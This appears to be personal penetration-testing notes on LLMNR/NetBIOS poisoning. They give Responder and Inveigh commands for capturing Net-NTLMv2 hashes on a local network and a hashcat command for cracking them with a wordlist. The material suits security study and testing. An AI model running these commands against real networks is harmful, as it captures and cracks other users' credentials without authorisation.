**LLMNR/NetBIOS lookups** are used by Windows when DNS fails to resolve a hostname. Because these requests are broadcast over the local network, a malicious host can intercept and respond to them. By running **Responder**, an attacker can capture Net-NTLMv2 password hashes through a Man-in-the-Middle (MitM) attack on the challenge/response messages that are part of the NTLM authentication protocol.
### Linux

```bash
responder -I eth0
```

User goes to a share that does not exist:

![[Pasted image 20240810230946.png]]

NTLMv2 password is captured:

![[Pasted image 20240815233653.png]]

To crack

```bash
hashcat -m 5600 ntlmv2.hashcat /opt/rockyou.txt
```

Common flags to use:

- -A: Allowing us to see NBT-NS, BROWSER, and LLMNR requests in the environment without poisoning any responses.
- -f: Will attempt to fingerprint the remote host operating system and version.
- -w: Utilises the built-in WPAD proxy server. This can be highly effective, especially in large organisations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has `auto detect` enabled
- -v: Increased verbosity
### Windows

Powershell version is no longer updated

```bash
wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/refs/heads/master/Inveigh.ps1 -outfile Inveigh.ps1
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

And `exe` version exists, however this requires elevated permissions to use:

https://github.com/Kevin-Robertson/Inveigh

